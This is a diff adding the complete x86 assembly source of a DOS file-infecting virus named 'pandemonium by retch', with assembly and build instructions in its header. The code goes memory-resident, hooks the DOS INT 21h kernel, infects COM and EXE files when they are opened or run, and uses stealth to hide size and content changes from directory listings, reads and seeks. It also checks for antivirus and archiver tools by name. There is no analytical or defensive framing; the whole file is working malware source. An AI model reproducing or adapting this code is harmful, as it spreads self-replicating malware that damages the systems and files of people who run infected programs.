@@ -1,0 +1,695 @@
+; com/exe tsr stealth. patches int 21 kernel. go res in umb.
+;
+; thanks lapse for insights.
+;
+; a86 virus.asm virus.com
+; or
+; tasm /m virus.asm | tlink virus.obj | exe2bin virus.exe virus.bin
+
+bytesize = vend-vstart
+parasize = (memend-vstart+0fh)/10h
+.model  tiny
+.code
+        org     0
+
+vstart: mov     word ptr ds:[0],20cdh
+        call    pushall
+delta:  push    bp
+        mov     bp,[bp+push_ret]
+        call    install
+        mov     bx,bp
+        pop     bp
+        mov     ax,[bp+push_ds]
+markerloc = $
+marker    = 1005h
+        add     ax,10h
+        add     cs:[bx+savecs-delta],ax
+        add     cs:[bx+savess-delta],ax
+        call    popall
+        mov     sp,0fff0h
+savess  =       $-2
+        mov     ss,sp
+        mov     sp,0fffeh
+savesp  =       $-2
+        db      0eah
+saveip  dw      0
+savecs  dw      0fff0h
+        db      0dh,0ah,"pandemonium by retch",0dh,0ah
+install:mov     ax,5802h
+        int     21h
+        cbw
+        push    ax
+        mov     bx,1
+        call    setstat
+        mov     di,6h
+        mov     ch,1
+        jmp     short load
+loadptr:mov     di,es:[di]
+load:   les     di,es:[di]
+next:   inc     di
+        cmp     byte ptr es:[di-1],0eah
+        jz      load
+        cmp     word ptr es:[di-2],2effh
+        jz      loadptr
+        cmp     word ptr es:[di-4],0e18ah
+        loopnz  next
+        mov     al,es:[di-1]
+        cbw
+        add     di,ax
+        cmp     word ptr es:[di],0fc80h
+        jnz     exitinstall
+        mov     ax,es:[di+2]
+        mov     cs:[bp+savecmp-delta],ax
+        push    es
+        push    di
+        add     di,5
+        mov     cs:[bp+i21_1+2-delta],es
+        mov     cs:[bp+i21_2+2-delta],es
+        mov     cs:[bp+i21_1-delta],di
+        mov     al,es:[di-1]
+        cbw
+        add     di,ax
+        mov     cs:[bp+i21_2-delta],di
+        xor     di,di
+        mov     ax,5800h
+        int     21h
+        xchg    ax,cx
+        mov     ax,5801h
+        mov     bx,81h
+        int     21h
+alloc:  lea     ax,[di+4800h]
+        mov     bx,parasize
+        call    int21
+        jnc     got_mem
+        call    getpsp
+        mov     es,bx
+        call    mcb_es
+        mov     bx,es:[di+3]
+        sub     bx,parasize+1
+        mov     es,ax
+        lea     ax,[di+4a00h]
+        call    int21
+        jmp     short alloc
+exitinstall:
+        pop     bx
+setstat:mov     ax,5803h
+        int     21h
+        ret
+got_mem:mov     es,ax
+        mov     bx,cx
+        mov     bh,0
+        mov     ax,5801h
+        int     21h
+        call    mcb_es        
+        mov     es:[di+1],ax
+        mov     es,ax
+        mov     cx,bytesize
+        lea     si,[bp+vstart-delta]
+        call    copy
+        pop     di
+        pop     ds
+        mov     byte ptr [di],0eah
+        mov     word ptr [di+1],offset newi21
+        mov     [di+3],es
+        jmp     short exitinstall
+mcb_es: mov     ax,es
+mcb_ax: dec     ax
+        mov     es,ax
+        inc     ax
+        ret
+copy:   lods    byte ptr cs:[si]
+        stos    byte ptr [di]
+        loop    copy
+        ret
+
+exiti21:call    popall
+        jmp     emulateoldcode
+int21:  pushf
+        push    cs
+        call    emulateoldcode
+        ret
+emulateoldcode:
+        cmp     ah,0
+savecmp =       $-1
+savejmp:jz      fixup
+        db      0eah
+i21_1   dd      0
+fixup:  db      0eah
+i21_2   dd      0
+
+newi21: call    pushall
+        call    checkcaller
+        mov     di,offset i21tab-3
+        db      0b9h
+stealthmode dw  ?
+findfnc:add     di,3
+        cmp     ah,cs:[di]
+        loopnz  findfnc
+        mov     ax,cs:[di+1]
+        jz      useit
+        mov     ax,offset exiti21
+useit:  push    ax
+        mov     ax,[bp+push_ax]
+        mov     cx,[bp+push_cx]
+        mov     di,[bp+push_di]
+        ret
+        
+i21tab: db      3dh
+        dw      offset infectdx
+        db      4bh
+        dw      offset exec
+        db      6ch
+        dw      offset infectsi
+nostealth = ($-i21tab)/3
+        db      11h
+        dw      offset fcbdir
+        db      12h
+        dw      offset fcbdir
+        db      13h
+        dw      offset delete
+        db      3fh
+        dw      offset read
+        db      40h
+        dw      offset write
+        db      41h
+        dw      offset unlink
+        db      42h
+        dw      offset lseek
+        db      4eh
+        dw      offset ascdir
+        db      4fh
+        dw      offset ascdir
+        db      57h
+        dw      offset time
+allfunctions = ($-i21tab)/3
+
+delete: mov     si,dx
+        inc     si
+        cmp     byte ptr [si-1],0ffh
+        jnz     normal
+        add     si,7
+normal: push    cs
+        pop     es
+        mov     di,offset header
+        mov     cx,8
+copynam:movsb
+        cmp     byte ptr ds:[si],' '
+        loopnz  copynam
+        lea     si,[bx+8]
+        mov     al,'.'
+        stosb
+        movsw
+        movsb
+        mov     byte ptr es:[di],0
+        call    getdta
+        push    es
+        push    bx
+        push    cs
+        pop     ds
+        mov     dx,offset dta
+        mov     ah,1ah
+        call    int21
+        mov     dx,offset header
+        mov     cx,8
+        mov     ah,4eh
+        cmp     ax,0
+        org     $-2
+fnext:  mov     ah,4fh
+        call    int21
+        jc      restdta
+        mov     dx,offset dta+1eh
+        call    open
+        xchg    ax,bx
+        jc      fnext
+        call    disinf_handle
+        call    close
+        jmp     short fnext
+restdta:pop     dx
+        pop     ds
+        mov     ah,1ah
+        call    int21
+        jmp     short exiti21_1
+
+time:   cmp     al,1
+        jz      setting_time
+        call    popall
+        call    int21
+        call    pushall
+        jc      donesub
+        sub     dh,0c8h
+        jb      donesub
+        mov     byte ptr [bp+push_dx+1],dh
+donesub:jmp     pop_retf2
+setting_time:
+        cmp     dh,0c8h
+        jb      exiti21_1
+        call    infecthandle
+        jmp     short exiti21_1
+
+unlink: call    open
+        jc      exiti21_1
+        xchg    ax,bx
+        call    disinf_handle
+        call    close
+        jmp     short exiti21_1
+write:  call    disinf_handle
+exiti21_1:
+        jmp     exiti21
+
+disinf_handle:
+        call    gettime
+        jb      exit_disinf
+        sub     dh,0c8h
+        push    cx
+        push    dx
+        call    readoldheader
+        mov     dx,0-bytesize
+        mov     cx,-1
+        mov     al,2
+        call    ls
+        xor     cx,cx
+        mov     ah,40h
+        call    int21
+        call    ls_s
+        call    wheader
+        call    restorefp
+        pop     dx
+        pop     cx
+        call    settime
+exit_disinf:
+        ret
+read:   call    checkyears
+        jb      exiti21_1
+        call    readoldheader
+        mov     cx,-1
+        mov     dx,0-bytesize
+        mov     al,2
+        call    ls
+        mov     cs:[vpos_hi],dx
+        mov     cs:[vpos_lo],ax
+        mov     dx,cs:[fp_hi]
+        mov     ax,cs:[fp_lo]
+        cmp     dx,cs:[vpos_hi]
+        jb      adjust
+        ja      inbody
+        cmp     ax,cs:[vpos_lo]
+        jae     inbody           
+adjust: mov     cx,[bp+push_cx]
+        add     ax,cx
+        adc     dx,0
+        cmp     dx,cs:[vpos_hi]
+        jb      doread
+        sub     ax,cs:[vpos_lo]
+        jb      doread
+        sub     cx,ax
+        cmp     ax,0
+        org     $-2
+inbody: xor     cx,cx
+doread: push    cx
+nopush: call    restorefp
+        pop     cx
+        mov     dx,[bp+push_dx]
+        mov     ds,[bp+push_ds]
+        mov     ah,3fh
+        call    int21
+        call    saveret
+        jc      doneread
+        or      ax,ax
+        jz      doneread
+        cmp     word ptr cs:[fp_hi],0
+        ja      doneread
+        cmp     word ptr cs:[fp_lo],18h
+        jae     doneread
+        mov     si,cs:[fp_lo]
+        push    ax
+        add     ax,si
+        cmp     ax,18h
+        pop     ax
+        jb      move
+        mov     ax,si
+        sub     ax,18h
+        neg     ax
+move:   xchg    ax,cx
+        add     si,offset header
+        mov     di,dx
+        push    ds
+        pop     es
+        call    copy
+doneread:
+        jmp     pop_retf2
+vpos_hi dw      0
+vpos_lo dw      0
+saveret:mov     [bp+push_ax],ax
+        jnc     sretnoc
+        or      byte ptr [bp+push_f],1
+        stc
+sretnoc:ret
+readoldheader:
+        xor     cx,cx
+        xor     dx,dx
+        mov     al,1
+        call    ls
+        mov     word ptr cs:[fp_hi],dx
+        mov     word ptr cs:[fp_lo],ax
+        mov     al,2
+        mov     cx,-1
+        mov     dx,-18h
+        call    ls
+        call    rheader        
+restorefp:
+        db      0b9h
+fp_hi   dw      0
+        db      0bah
+fp_lo   dw      0
+        mov     al,0
+        jmp     ls
+lseek:  call    checkyears
+        jb      doneadjust
+        cmp     al,2
+        jnz     doneadjust
+        sub     dx,bytesize
+        sbb     cx,0
+doneadjust:
+        call    int21
+        call    saveret
+        jc      donelseek
+        mov     [bp+push_dx],dx
+donelseek:
+        jmp     pop_retf2
+
+checkyears:
+        push    ax
+        push    cx
+        push    dx
+        call    gettime
+        pop     dx
+        pop     cx
+        pop     ax
+        ret
+exec:   cmp     al,1
+        jz      clean
+        jb      infectdx
+        jmp     exiti21
+clean:  call    popall
+        mov     word ptr cs:[pblock],bx
+        mov     word ptr cs:[pblock+2],es
+        call    int21
+        call    pushall
+        les     di,cs:[pblock]
+        add     di,0eh
+        lds     si,es:[di+4]
+        xor     cx,cx
+        cmp     byte ptr [si],0e9h
+        jnz     chkmark
+        inc     cx
+        lodsb
+        lodsw
+        add     si,ax
+chkmark:cmp     word ptr [si+markerloc],marker
+        jnz     pop_retf2
+        jcxz    notcom
+        mov     ax,[si+saveip]
+        sub     ax,103h
+        mov     ds:[101h],ax
+        jmp     short pop_retf2
+notcom: push    es:[di]
+        push    es:[di+2]
+        call    getpsp
+        add     bx,10h
+        add     word ptr [si+savecs],bx
+        add     word ptr [si+savess],bx
+        mov     ax,word ptr [si+savesp]
+        dec     ax
+        dec     ax
+        stosw
+        mov     ax,word ptr [si+savess]
+        stosw
+        mov     ax,word ptr [si+saveip]
+        stosw
+        mov     ax,word ptr [si+savecs]
+        stosw
+        pop     ds
+        pop     si
+        lodsw
+        les     di,es:[di-8]
+        stosw
+pop_retf2:
+        call    popall
+        retf    2
+infectsi:
+        mov     dx,si
+infectdx:
+        call    open
+        jc      exiti21_2
+        xchg    ax,bx
+        call    infecthandle
+        call    close
+exiti21_2:
+        jmp     exiti21
+
+infecthandle:
+        xor     di,di
+        call    gettime
+        push    cx
+        push    dx
+        jae     time_exit
+        call    rheader
+        sub     byte ptr [si],0e9h
+        jz      inf_com
+        sub     word ptr [si],5a64h
+        jz      inf_exe
+time_exit:
+        pop     dx
+        pop     cx
+        add     dx,di
+        call    settime
+        ret
+inf_com:mov     ax,[si+1]
+        add     ax,103h
+        mov     word ptr [saveip],ax
+        mov     word ptr [savesp],0fffeh
+        mov     ax,0fff0h
+        mov     word ptr [savecs],ax
+        mov     word ptr [savess],ax
+        call    ls_e
+        or      dx,dx
+        jnz     time_exit
+        cmp     ax,0f000h
+        ja      time_exit
+        mov     byte ptr [si],0e9h
+        sub     ax,3
+        push    ax
+        call    writevirus
+        pop     [si+1]
+        jc      time_exit
+dohead: call    ls_s
+        call    wheader
+        mov     di,0c800h
+j_te:   jmp     short time_exit
+inf_exe:
+        call    read2
+        cmp     word ptr [si],40h
+        jz      time_exit
+        call    read2
+        cmp     word ptr [si],0
+        jnz     time_exit
+        mov     word ptr [si],'ZM'
+        cmp     word ptr [si+0ch],-1
+        jnz     time_exit
+        push    [si+0eh]
+        push    [si+10h]
+        push    [si+14h]
+        push    [si+16h]
+        pop     word ptr [di+savecs]
+        pop     word ptr [di+saveip]
+        pop     word ptr [di+savesp]
+        pop     word ptr [di+savess]
+        call    ls_e
+        push    dx
+        push    ax
+        call    writevirus
+        jc      j_te
+        mov     word ptr [si+0ah],0
+        pop     ax
+        pop     dx
+        push    dx
+        push    ax
+        add     ax,bytesize
+        adc     dx,0
+        mov     cx,200h
+        div     cx
+        or      dx,dx
+        jz      noinc
+        inc     ax
+noinc:  mov     [si+2],dx
+        mov     [si+4],ax
+        pop     ax
+        pop     dx
+        mov     cx,10h
+        div     cx
+        sub     ax,[si+8]
+        mov     word ptr [si+14h],dx
+        mov     word ptr [si+16h],ax
+        inc     ax
+        mov     word ptr [si+0eh],ax
+        mov     word ptr [si+10h],(bytesize+150h) and 0ff00h
+        jmp     dohead
+        db      0,"17/04/96",0
+fcbdir: call    popall
+        call    int21
+        call    pushall
+        cmp     al,0
+        jnz     go_pop_retf2
+        call    getdta
+        cmp     byte ptr es:[bx],-1
+        jnz     noadd
+        add     bx,7h
+noadd:  add     bx,1dh
+        lea     si,[bx-4]
+        jmp     short checkifcomspec
+ascdir: call    popall
+        call    int21
+        call    pushall
+        jc      go_pop_retf2
+        call    getdta
+        add     bx,1ah
+        lea     si,[bx-2]
+checkifcomspec:
+        push    ax
+        push    es
+        push    bx
+        call    getpsp
+        mov     es,bx
+        cmp     bx,es:[16h]
+        pop     bx
+        pop     es
+        pop     ax
+        jnz     go_pop_retf2
+        cmp     byte ptr es:[si+1],al
+        jb      go_pop_retf2
+        sub     byte ptr es:[si+1],al
+        sub     word ptr es:[bx],bytesize
+        sbb     word ptr es:[bx+2],0
+go_pop_retf2:
+        jmp     pop_retf2
+checkcaller:
+        push    bx
+        push    ds
+        push    ax
+        push    si
+        mov     word ptr cs:[stealthmode],allfunctions
+        mov     ah,51h
+        call    int21
+        dec     bx
+        mov     ds,bx
+        mov     bx,word ptr ds:[0008h]
+        mov     si,offset names
+searchnames:
+        cmp     si,offset endnam
+        jz      exitcheckcaller
+        lods    word ptr cs:[si]
+        cmp     ax,bx
+        jnz     searchnames
+gothelper:
+        mov     word ptr cs:[stealthmode],nostealth
+exitcheckcaller:
+        pop     si
+        pop     ax
+        pop     ds
+        pop     bx
+        ret
+names   db      'F-'
+        db      'TB'
+        db      'AR'
+        db      'RA'
+        db      'LH'
+        db      'PK'
+        db      'CH'
+endnam:
+read2:  mov     ah,3fh
+        mov     cx,2
+        jmp     short si_21
+writevirus:
+        mov     ah,40h
+        mov     cx,bytesize
+        cwd
+        jmp     short j_int21
+gettime:mov     al,0
+        cmp     ax,0
+        org     $-2
+settime:mov     al,1
+        mov     ah,57h
+        call    int21
+        cmp     dh,0c8h
+        ret
+rheader:mov     ah,3fh
+        cmp     ax,0
+        org     $-2
+wheader:mov     ah,40h
+        mov     dx,offset header
+        mov     cx,18h
+si_21:  mov     si,dx
+        push    cs
+        pop     ds
+        jmp     int21
+ls_e:   mov     al,2
+        cmp     ax,0
+        org     $-2
+ls_s:   mov     al,0
+        xor     cx,cx
+        xor     dx,dx
+ls:     mov     ah,42h
+        jmp     short j_int21
+getdta: mov     ax,2fc8h
+j_int21:jmp     int21
+open:   mov     ax,3d02h
+        cmp     ax,0
+        org     $-2
+close:  mov     ah,3eh
+        cmp     ax,0
+        org     $-2
+getpsp: mov     ah,51h
+        jmp     short j_int21
+
+push_es =       00h
+push_ds =       02h 
+push_di =       04h
+push_si =       06h
+push_bp =       08h
+push_bx =       0ah
+push_dx =       0ch
+push_cx =       0eh
+push_ax =       10h
+push_f  =       12h
+push_ret =      14h
+pushall:pushf
+        push    ax
+        push    cx
+        push    dx
+        push    bx
+        push    bp
+        push    si
+        push    di
+        push    ds
+        push    es
+        mov     bp,sp
+        cld
+        jmp     ss:[bp+push_ret]
+popall: pop     ss:[bp+push_ret]
+        pop     es
+        pop     ds
+        pop     di
+        pop     si
+        pop     bp
+        pop     bx
+        pop     dx
+        pop     cx
+        pop     ax
+        popf
+        ret
+header  db      18h dup (0)
+vend:
+dta     db      2bh dup (0)
+pblock  dd      0
+memend:
+        end     vstart
